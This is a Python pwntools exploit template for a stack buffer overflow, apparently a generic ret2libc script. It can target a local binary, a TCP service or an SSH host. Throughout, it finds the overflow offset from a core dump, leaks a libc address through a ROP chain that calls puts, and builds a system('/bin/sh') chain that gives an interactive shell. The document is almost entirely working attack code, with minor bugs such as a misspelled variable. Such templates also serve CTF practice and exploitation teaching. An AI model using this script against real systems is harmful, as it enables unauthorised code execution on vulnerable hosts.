from pwn import *
# TO ALLOW CORE FILE 
# sudo sysctl -w kernel.core_pattern=core

####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = True

LOCAL_BIN = "./test/ret"
REMOTE_BIN = "~/vuln" #For ssh
LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it

if LOCAL:
    pty = process.PTY
    p = process(LOCAL_BIN,stdin=pty, stdout=pty)
    log.info("Process started")
    ELF_LOADED = ELF(LOCAL_BIN)
    log.info("Extracting data from binary")
    ROP_LOADED = ROP(ELF_LOADED)
    log.info("Finding ROP gadgets")

elif REMOTETTCP:
    p = remote('10.10.10.10',1337) 
    log.info("Process connected")
    ELF_LOADED = ELF(LOCAL_BIN)
    log.info("Extracting data from binary")
    ROP_LOADED = ROP(ELF_LOADED)
    log.info("Finding ROP gadgets")

elif REMOTESSH:
    ssh_shell = ssh('user', 'ip', password='pass', port=1337)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continues
    # You can set breakpoints, for example "b *main"
    gdbscript = '''
b *main
c
b *0x0000000000401185
'''
    io = gdb.debug("./test/ret",gdbscript=gdbscript)

##########################
##### OFFSET FINDER ######
##########################
OFFSET = b"" # if known, should be set
if OFFSET == b"":
	log.info("Searching for offset")
	p.sendline(cyclic(256,n=8))
	p.wait()
	core = Coredump('./core')
	myoffset = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {myoffset}")
	OFFSET = b"A"*myoffset

#####################
#### Find Gadgets ###
#####################
try:
    libc_func = "puts"
    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call puts
except:
    libc_func = "printf"
    PUTS_PLT = ELF_LOADED.plt['printf']

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))

#########################
#### Finf LIBC offset ###
#########################
def generate_payload_aligned(rop):
    payload1 = rop
    if (len(payload1) % 16) == 0:
    	log.info("Payload already aligned")
    	return payload1
    else:
        payload2 = OFFSET + p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1

def get_addr(libc_func,p):
    FUNC_GOT = ELF_LOADED.got[libc_func]
    log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    log.info("Aligning payload")
    rop1 = generate_payload_aligned(rop1)

    # Send our rop-chain payload
    log.info(f"Going to use the following payload:\n{rop1}")
    p.sendline(rop1)
    pause(10)
    # If binary is echoing back the payload, remove that message
    print(p.recvline())
    print(p.recvline())
    received = p.recvline().strip()
    if OFFSET[:30] in received:
    	recieved = p.recvline().strip()
    
    # Parse leaked address
    log.info(f"Length rop1: {len(rop1)}")
    leak = u64(received.ljust(8, b"\x00"))
    log.info(f"Leaked LIBC address, {libc_func}: {hex(leak)}")
    
    # Set lib base address
    if LIBC:
        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
        log.info("LIBC base @ %s" % hex(LIBC.address))

    # If not LIBC yet, stop here
    else:
        log.warning("TO CONTINUE: Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
        p.interactive()
        exit()
    
    return hex(leak)

get_addr(libc_func,p) #Search for puts address in memory to obtain LIBC base

##############################
##### FINAL EXPLOITATION #####
##############################

BINSH = next(LIBC.search(b"/bin/sh"))  #Verify with find /bin/sh
SYSTEM = LIBC.sym["system"]
EXIT = LIBC.sym["exit"]

log.info("POP_RDI %s " % hex(POP_RDI))
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("exit %s " % hex(EXIT))

rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
rop2 = generate_payload_aligned(rop2)

p.clean()
p.sendline(rop2)

p.interactive() 